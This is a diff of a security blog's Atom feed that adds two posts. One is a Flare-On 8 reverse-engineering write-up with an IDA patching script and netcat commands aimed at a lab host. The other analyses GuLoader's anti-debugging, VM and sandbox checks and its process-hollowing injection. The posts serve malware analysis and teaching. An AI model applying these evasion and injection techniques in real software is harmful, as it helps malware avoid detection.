@@ -1,20 +1,251 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-07-18T05:19:28-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">HOME</title><subtitle>This website contains some usefull tutorials and my own write-ups for cyber security challenges</subtitle><entry><title type="html">HelloKitty Linux version malware analysis</title><link href="http://localhost:4000/2021/07/17/hellokitty_linux.html" rel="alternate" type="text/html" title="HelloKitty Linux version malware analysis" /><published>2021-07-17T12:08:00-05:00</published><updated>2021-07-17T12:08:00-05:00</updated><id>http://localhost:4000/2021/07/17/hellokitty_linux</id><content type="html" xml:base="http://localhost:4000/2021/07/17/hellokitty_linux.html">&lt;h2 id=&quot;please-read-the-disclaimer&quot;&gt;Please read the &lt;a href=&quot;/disclaimer/&quot;&gt;disclaimer&lt;/a&gt;&lt;/h2&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-11-15T11:18:23+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">HOME</title><subtitle>This website contains some usefull tutorials and my own write-ups for cyber security challenges</subtitle><entry><title type="html">Flare-on8 challenge 9</title><link href="http://localhost:4000/2021/10/31/flare-on8-chall9.html" rel="alternate" type="text/html" title="Flare-on8 challenge 9" /><published>2021-10-31T00:05:00+02:00</published><updated>2021-10-31T00:05:00+02:00</updated><id>http://localhost:4000/2021/10/31/flare-on8-chall9</id><content type="html" xml:base="http://localhost:4000/2021/10/31/flare-on8-chall9.html">&lt;h2 id=&quot;please-read-the-disclaimer&quot;&gt;Please read the &lt;a href=&quot;/disclaimer/&quot;&gt;disclaimer&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;A quick static analysis of the binary main function shows invalid instructions between valid ones, we notice the use of instructions that will eventually generate an exception example :&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;xor eax, eax
+div eax
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;An experienced malware analyst will recognize the obfuscation technique were the binary registers exception handler(s) (SEH or VEH) that patch the code at run time and restore the execution flow.&lt;/p&gt;
+
+&lt;p&gt;Using TinyTracer &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://github.com/hasherezade/tiny_tracer&lt;/code&gt; by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@hasherezade&lt;/code&gt;, I noticed the use of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addvectoredexceptionhandler&lt;/code&gt; WINAPI, to make static analysis easier we can load the .tag file to IDA PRO.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on8/20211114203551.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;veh-handler-analysis&quot;&gt;VEH handler analysis&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on8/20211114203604.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Thanks to Tinytracer comments, we notice that the function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x4054b0&lt;/code&gt; fetch the address of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VirtualProtect&lt;/code&gt;, it takes 2 parameters that look like hashes. a deeper analysis shows that this function is used to dynamically import functions were the second argument is the hash of the functon name.&lt;/p&gt;
+
+&lt;p&gt;We notice a second call to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x4054b0&lt;/code&gt; function with edx, and ecx as arguments, going back to the main function before the exception occurred we see the 2 hashes are loaded into ecx, and edx.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on8/20211114204629.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;the return value (a function pointer) is written to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ContextRecord-&amp;gt;eax&lt;/code&gt;.
+Next a call to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VirtualProtect&lt;/code&gt; to set the memory writable followed by a patch at offset &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EIP+3&lt;/code&gt; with the opcode &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;call eax (0XD0FF)&lt;/code&gt; then increments &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ContextRecord-&amp;gt;EIP&lt;/code&gt; by 3 and finally calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VirtualProtect&lt;/code&gt; to remove the write attribute.&lt;/p&gt;
+
+&lt;p&gt;I wrote the following python script to fix the code and get a clean disassembly view for static analysis&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;idautils&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;idaapi&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;idc&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;#list of used instructions that generate exceptions 
+#33 FF F7 F7
+#33 C0 8B 00
+#33 C0 f7 f0
+#33 F6 F7 F6 xor     esi, esi ; div     esi
+&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;seg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_segm_by_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;.text&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;seg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start_ea&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;end_seg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;seg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;end_ea&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf7f7ff33&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x008bc033&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xf0f7c033&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xf6f7f633&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+
+
+&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;end_seg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ida_bytes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_dword&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;ida_bytes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;patch_word&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xd0ff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;ida_bytes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;patch_byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x90&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;anti-reverse-engineering-techniques&quot;&gt;Anti reverse engineering techniques&lt;/h3&gt;
+&lt;p&gt;We can notice the usage of different anti reverse engineer techniques, I will enumerate some of them:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Check of hardware breakpoints&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Patch DbgUiRemoteBreakin DbgBreakPoint&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Check PEB BeingDebugged flag&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;We can bypass the anti reverse engineer techniques by noping or overstepping ( I will not go in details due to time restriction).&lt;/p&gt;
+
+&lt;h3 id=&quot;network-packet-sniffing&quot;&gt;Network packet sniffing&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on8/20211114203654.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The function &lt;strong&gt;0x403a70&lt;/strong&gt; configure a network listener in promiscuous mode on the interface given as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ARGV[1]&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;After that a thread is created to execute the function &lt;strong&gt;0x404310&lt;/strong&gt;. This function parses the incoming packets looking for UDP packets on port &lt;strong&gt;4356&lt;/strong&gt; with specific flags set.
+If the checks are successful, the &lt;strong&gt;UDP&lt;/strong&gt; data is written to a structure that will be read by another thread executing the function &lt;strong&gt;0x404310&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;analysing-the-function-0x404310&quot;&gt;Analysing the function &lt;strong&gt;0x404310&lt;/strong&gt;&lt;/h3&gt;
+
+&lt;p&gt;The function has basically 3 blocks of instructions that will be executed according to the first Dword of the UDP data packet (0x0, 0x1, 0x2).&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on8/20211114203704.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;command-0&quot;&gt;Command #0:&lt;/h4&gt;
+&lt;p&gt;This command decrypts a fake flag from memory, we can dismiss it.&lt;/p&gt;
+
+&lt;h4 id=&quot;command-1&quot;&gt;Command #1:&lt;/h4&gt;
+&lt;p&gt;This command expects another Dword followed by a string, the Dword is the size of the string (including &lt;strong&gt;\x00&lt;/strong&gt;)
+Then 4 interesting keywords are decrypted &lt;strong&gt;g0d&lt;/strong&gt;, &lt;strong&gt;L0ve&lt;/strong&gt;, &lt;strong&gt;s3cret&lt;/strong&gt; and &lt;strong&gt;5Ex&lt;/strong&gt;. a routine checks if the input is equal to one of the keywords, if yes, it will calculate the hash of the string and save it to a buffer.
+In total we will have 4 buffers holding the hash of each keyword.&lt;/p&gt;
+
+&lt;h4 id=&quot;command-2&quot;&gt;Command #2:&lt;/h4&gt;
+&lt;p&gt;And finally the last command also expects a Dword (size of string) and the string &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MZ&lt;/code&gt;.
+It uses the buffers populated with the previous hashes to decrypt the flag.&lt;/p&gt;
+
+&lt;p&gt;Using netcat and python we can get the flag with the following commands&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python -c 'print &quot;\x02\x00\x00\x00&quot; + &quot;\x04\x00\x00\x00&quot; + &quot;g0d\x00&quot;' | nc -u 172.16.45.128 4356
+python -c 'print &quot;\x02\x00\x00\x00&quot; + &quot;\x04\x00\x00\x00&quot; + &quot;5Ex\x00&quot;' | nc -u 172.16.45.128 4356
+python -c 'print &quot;\x02\x00\x00\x00&quot; + &quot;\x07\x00\x00\x00&quot; + &quot;s3cret\x00&quot;' | nc -u 172.16.45.128 4356
+python -c 'print &quot;\x02\x00\x00\x00&quot; + &quot;\x05\x00\x00\x00&quot; + &quot;L0ve\x00&quot;' | nc -u 172.16.45.128 4356
+# get flag
+python -c 'print &quot;\x03\x00\x00\x00&quot; + &quot;\x03\x00\x00\x00&quot; + &quot;MZ\x00&quot;' | nc -u 172.16.45.128 4356
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="reverse" /><summary type="html">Please read the disclaimer</summary></entry><entry><title type="html">GuLoader Anti reverse engineering techniques</title><link href="http://localhost:4000/2021/09/05/GuLoader.html" rel="alternate" type="text/html" title="GuLoader Anti reverse engineering techniques" /><published>2021-09-05T19:08:00+02:00</published><updated>2021-09-05T19:08:00+02:00</updated><id>http://localhost:4000/2021/09/05/GuLoader</id><content type="html" xml:base="http://localhost:4000/2021/09/05/GuLoader.html">&lt;h2 id=&quot;please-read-the-disclaimer&quot;&gt;Please read the &lt;a href=&quot;/disclaimer/&quot;&gt;disclaimer&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;In this quick blog post, we take a look specifically at the Anti reverse engineer techniques used by a recent GuLoader sample.
+This blog post can be used a reference for other researchers to understand the techniques used by GuLoader.&lt;/p&gt;
+
+&lt;h3 id=&quot;code-obfuscation-through-jumps&quot;&gt;Code obfuscation through jumps&lt;/h3&gt;
+
+&lt;p&gt;We can see the malware obfuscate the assembly code by using unconditional jumps to mess up the disassembly.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/GuLoader_malware/20210906202548.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;opaque-predicate-in-conditional-jumps&quot;&gt;Opaque predicate in conditional jumps&lt;/h3&gt;
+&lt;p&gt;In other word, it will always evaluate to either a false or a true statement, this is used to fool the disassembler that there is 2 paths but in reality it is just one single path.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/GuLoader_malware/20210906202918.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;obfuscation-of-functions-parameters-through-arithmetic-calculation&quot;&gt;Obfuscation of functions parameters through arithmetic calculation&lt;/h3&gt;
+&lt;p&gt;In this example we see the parameter of &lt;strong&gt;get_func_address&lt;/strong&gt; is xored multiple time.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/GuLoader_malware/20210906204419.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;dynamic-retrieval-of-winapi-function-addresses&quot;&gt;Dynamic retrieval of WinAPI function addresses&lt;/h3&gt;
+&lt;p&gt;It first parse the &lt;strong&gt;PEB_LDR_DATA&lt;/strong&gt; of &lt;strong&gt;PEB structure&lt;/strong&gt; of the process, locates kernel32, then looks for &lt;strong&gt;LoadLibraryA&lt;/strong&gt; function.
+Then the malware parse the library, hash function names with &lt;strong&gt;DJB2&lt;/strong&gt; hashing algorithm and compare with the hash given as parameter to the function.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/GuLoader_malware/20210907213532.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;xoring-dexoring-the-text-instructions-to-break-the-disassembly-view&quot;&gt;Xoring dexoring the .text instructions to break the disassembly view&lt;/h3&gt;
+&lt;p&gt;Before calling a WINAPI, the malware xors the whole shellcode, then dexor it after calling the WINAPI function.
+The purpose of this technique is to break the dissasembly view (functions recognized by the disassembler, the graph view etc…)&lt;/p&gt;
+
+&lt;h3 id=&quot;check-for-hardware-and-software-breakpoints&quot;&gt;Check for hardware and software breakpoints&lt;/h3&gt;
+&lt;p&gt;The malware uses &lt;strong&gt;ZwGetThreadContext&lt;/strong&gt; WINAPI to check if hardware breakpoints are set by checking DR0-7 registers.&lt;/p&gt;
+
+&lt;p&gt;It also check for software breakpoints before calling a WINAPI function by comparing it’s first bytes to &lt;strong&gt;0xCC&lt;/strong&gt; &lt;strong&gt;0X3CD&lt;/strong&gt; &lt;strong&gt;0xB0F&lt;/strong&gt;, if breakpoints are set the malware will crash itself.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/GuLoader_malware/20210906213747.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;detect-virtual-machine-through-cpuid&quot;&gt;Detect virtual machine through CPUID&lt;/h3&gt;
+&lt;p&gt;Calling CPUID with eax set to 1 can be used to detect if the malicious code is running inside a virtual machine, a quick fix for this is to change the .vmx config file for vmware to always return 0 in the 31st bit.
+Example: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cpuid.1.ecx=&quot;0---:----:----:----:----:----:----:----&quot;&lt;/code&gt; to be added to the .vmx&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/GuLoader_malware/20210906214146.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;check-if-it-is-running-in-a-64bit-machine&quot;&gt;Check if it is running in a 64bit machine&lt;/h3&gt;
+&lt;p&gt;The shellcode checks if the machine is a 64 bit machine, if yes it will switch to 64bit mode.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/GuLoader_malware/20210906214735.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;patching-dbgbreakpoint---dbguiremotebreakin&quot;&gt;Patching DbgBreakPoint &amp;amp;&amp;amp;  DbgUIRemoteBreakin&lt;/h3&gt;
+&lt;p&gt;The malware patchs both &lt;strong&gt;DbgBreakPoint&lt;/strong&gt; &lt;strong&gt;DbgUIRemoteBreakin&lt;/strong&gt; to prevent debuggers from attaching to the process.&lt;/p&gt;
+
+&lt;h3 id=&quot;count-the-number-of-application-windows-using-enumwindows&quot;&gt;Count the number of application windows using EnumWindows&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;EnumWindows&lt;/strong&gt; WINAPI is used to enumerate and count the open windows, this technique is used to detect sandboxes.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/GuLoader_malware/20210906220217.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;check-for-qemu&quot;&gt;Check for QEMU&lt;/h3&gt;
+&lt;p&gt;Guloader tries to open the following two files &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Program Files\Qemu-ga\qemu-ga.exe&lt;/code&gt;  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Program Files\qga\qga.exe&lt;/code&gt;, this files are related to Qemu emulator. It is used as sandbox detection&lt;/p&gt;
+
+&lt;h3 id=&quot;anti-debugging-ntsetinformationthread&quot;&gt;anti debugging NtSetInformationThread&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;NtSetInformationThread&lt;/strong&gt; API with &lt;strong&gt;ThreadHideFromDebugger&lt;/strong&gt; as parameter is used to hide the thread from a debugger, if a debugger is already present it will result in a crash.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/GuLoader_malware/20210906221314.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;enumerate-windows-devices&quot;&gt;Enumerate windows devices&lt;/h3&gt;
+&lt;p&gt;The malware uses &lt;strong&gt;EnumDeviceDrivers&lt;/strong&gt; and &lt;strong&gt;GetDeviceDriverBaseName&lt;/strong&gt; to enumerate windows drivers, their names are hashed and compared to pre-hashed values.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/GuLoader_malware/20210906224620.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;enumerate-installed-softwares&quot;&gt;Enumerate installed softwares&lt;/h3&gt;
+&lt;p&gt;It uses &lt;strong&gt;MsiEnumProductsA&lt;/strong&gt; &lt;strong&gt;MsiGetProductInfoA&lt;/strong&gt; WINAPI to enumerate installed softwares, the names are hashed then compared to pre-hashed values.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/GuLoader_malware/20210906225057.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;enumerate-services&quot;&gt;Enumerate Services&lt;/h3&gt;
+&lt;p&gt;The malware uses &lt;strong&gt;OpenSCManagerA&lt;/strong&gt; and &lt;strong&gt;EnumServicesStatusA&lt;/strong&gt; winAPI to enumerate services on the machine, the names are hashed then compared to pre-hashed values.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/GuLoader_malware/20210906230312.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;retrieve-the-port-number-of-the-debugger-for-the-process-using-the-ntqueryinformationprocess&quot;&gt;Retrieve the port number of the debugger for the process using the NtQueryInformationProcess&lt;/h3&gt;
+&lt;p&gt;Guloader retrieve the port number of the debugger for the process using &lt;strong&gt;NtQueryInformationProcess&lt;/strong&gt; API.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/GuLoader_malware/20210905164300.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;injecting-shellcode-through-process-hollowing&quot;&gt;Injecting shellcode through process hollowing&lt;/h3&gt;
+&lt;p&gt;The malware uses process hollowing injection technique to inject a similar shellcode with different capabilities, the following outlines the execution flow of the malware:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;It create a suspended process &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RegAsm.exe&lt;/code&gt; or  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MSBuild.exe&lt;/code&gt; with  &lt;strong&gt;CreateProcessInternalW&lt;/strong&gt; API.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/GuLoader_malware/20210907210239.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;It opens a handle to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Windows\syswow64\msvbvm60.dll&lt;/code&gt; with &lt;strong&gt;ZwOpenFile&lt;/strong&gt; WINAPI.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/GuLoader_malware/20210907210408.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;It creates a new section with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ZwCreateSection&lt;/code&gt; WINAPI.&lt;/li&gt;
+  &lt;li&gt;It maps the section in the created process using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NtMapViewOfSection&lt;/code&gt; WINAPI.&lt;/li&gt;
+  &lt;li&gt;It writes the shellcode to the memory with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NtWriteVirtualMemory&lt;/code&gt; WINAPI.&lt;/li&gt;
+  &lt;li&gt;It change the Instruction pointer of the process to the start of the injected shellcode with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NtSetContextThread&lt;/code&gt; WINAPI.&lt;/li&gt;
+  &lt;li&gt;Finally, it resume the thead with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NtResumeThread&lt;/code&gt; WINAPI.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;After bypassing all the anti reverse engineering mechanism, we can dump the second shellcode just before it calls for &lt;strong&gt;NtWriteVirtualMemory&lt;/strong&gt;, another solution is to change the first bytes of the new shellcode to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jmp 0x00&lt;/code&gt;, then we can attach to it with a debugger and restore the original bytes.&lt;/p&gt;
+
+&lt;p&gt;The second shellcode is a copy of the first shellcode so all the anti reverse engineering mechanism enumerated above applies to it.
+The second shellcode downloads a payload from a google drive link and execute it.&lt;/p&gt;
+
+&lt;h3 id=&quot;some-hashes-for-reference&quot;&gt;Some hashes for reference:&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;getcontextthread FAD4F3C4&lt;/li&gt;
+  &lt;li&gt;queryvirtualmemory 0F9CE5538&lt;/li&gt;
+  &lt;li&gt;kernel32 48522397&lt;/li&gt;
+  &lt;li&gt;LoadLibraryA 645AAB39&lt;/li&gt;
+  &lt;li&gt;NtAllocateVirtualMemory 4E829A87&lt;/li&gt;
+  &lt;li&gt;MSVBVM60 82AAF280&lt;/li&gt;
+  &lt;li&gt;ZwProtectVirtualMemory 85E648F6&lt;/li&gt;
+  &lt;li&gt;DbgBreakPoint 676E43AA&lt;/li&gt;
+  &lt;li&gt;DbgUiRemoteBreakin 0A3B0C16C&lt;/li&gt;
+  &lt;li&gt;TerminateProcess 9E059483&lt;/li&gt;
+  &lt;li&gt;EnumWindows BB301E26&lt;/li&gt;
+  &lt;li&gt;ExitProcess 98EC4D6B&lt;/li&gt;
+  &lt;li&gt;CreateFileA 97F9AE3&lt;/li&gt;
+  &lt;li&gt;NtSetInformationThread 0E9BE1A6F&lt;/li&gt;
+  &lt;li&gt;EnumDeviceDrivers 96ABEF9C&lt;/li&gt;
+  &lt;li&gt;vmmouse.sys 0D46C4133&lt;/li&gt;
+  &lt;li&gt;vm3dmp_loader.sys DC8850D2&lt;/li&gt;
+  &lt;li&gt;vm3dmp.sys 2B5C7A6B&lt;/li&gt;
+  &lt;li&gt;vmusbmouse.sys 5440D1F6&lt;/li&gt;
+  &lt;li&gt;MsiEnumProductsA 0E3F98748&lt;/li&gt;
+  &lt;li&gt;MsiGetProductInfoA 568AB98E&lt;/li&gt;
+  &lt;li&gt;ShellExecuteW 2A433AAE&lt;/li&gt;
+&lt;/ul&gt;</content><author><name></name></author><category term="malware" /><summary type="html">Please read the disclaimer</summary></entry><entry><title type="html">HelloKitty Linux version malware analysis</title><link href="http://localhost:4000/2021/07/17/hellokitty_linux.html" rel="alternate" type="text/html" title="HelloKitty Linux version malware analysis" /><published>2021-07-17T19:08:00+02:00</published><updated>2021-07-17T19:08:00+02:00</updated><id>http://localhost:4000/2021/07/17/hellokitty_linux</id><content type="html" xml:base="http://localhost:4000/2021/07/17/hellokitty_linux.html">&lt;h2 id=&quot;please-read-the-disclaimer&quot;&gt;Please read the &lt;a href=&quot;/disclaimer/&quot;&gt;disclaimer&lt;/a&gt;&lt;/h2&gt;
 
